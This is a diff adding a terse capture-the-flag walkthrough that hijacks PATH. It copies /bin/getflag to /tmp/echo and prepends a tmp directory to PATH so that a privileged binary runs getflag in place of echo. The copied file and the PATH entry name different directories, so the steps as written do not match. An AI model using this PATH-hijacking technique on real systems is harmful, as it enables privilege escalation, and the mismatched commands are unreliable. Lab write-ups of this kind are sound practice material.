@@ -1,0 +1,13 @@
+short stuff replace the echo by getflag
+
+cp the getflag in tmp cause you have right there
+to find the getflag use "which getflag"
+cp /bin/getflag /tmp/echo
+then change the PATH in env 
+export PATH=/tmp/name:$PATH
+
+relaunch binary get the flag
+
+
+cp /bin/getflag /tmp/echo
+export PATH=/tmp/name:$PATH
